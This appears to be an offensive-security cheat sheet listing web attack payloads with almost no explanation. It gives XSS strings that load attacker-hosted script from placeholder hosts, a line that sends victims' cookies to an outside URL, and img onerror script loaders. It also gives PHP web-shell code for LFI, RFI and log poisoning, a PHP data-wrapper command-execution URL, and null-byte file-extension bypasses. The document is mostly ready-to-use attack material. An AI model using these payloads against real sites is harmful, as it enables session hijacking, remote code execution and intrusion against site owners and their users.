# XSS

### reference: special characters for HTML and javascript
```
< > # used to denote HTML elements 
' " # strings
{ } # javascript function declarations
;   # end of statement
```
---

### php: file extension bypass
```
%00 # null byte in the URL will bypass the file extension in older PHP servers 
?   # ending url with ? will mark anything as part of query string
```
---

### javascript: XSS with script tag 
```html
<script src=http://OUR_IP></script>

'><script src=http://OUR_IP></script>

"><script src=http://OUR_IP></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<script>$.getScript("http://OUR_IP")</script>
```
---

### javascript: XSS content injection with iframe
```html
<iframe src=<your_url> height="0" weight="0"></iframe>
```
---

### javascript: XSS cookie exfiltration with javascript
```html
<script>new Image().src="<your_url>/page.html?output="+document.cookie;</script>
```
---

### javascript: payload from the external resource
```html
<script src="http://<your_ip>/xss.js"></script>
```
---

### javascript: use img tag to execute JS
```html
<img src='x' onerror='alert(0)'>
```
---

### javascript: use img tag to execute JS file
```html
<img src="x" onerror="const script=document.createElement('script');script.src='<js_url>';script.async=true;document.body.appendChild(script);">
```
---

# LFI

### php: LFI payload in PHP (can be used as log contamination)
```php
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

# RFI

### php: RFI payload in PHP (can be used as log contamination)
```php
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

# PHP Wrappers

### php: PHP data wrapper example:
```
<vuln_url>/<vuln_path>?<vuln_param>=data:text/plain,<?php echo shell_exec("whoami") ?>

# e.g.: http://10.10.0.2/menu.php?file=data:text/plain,<?php echo shell_exec("whoami") ?>
```
---

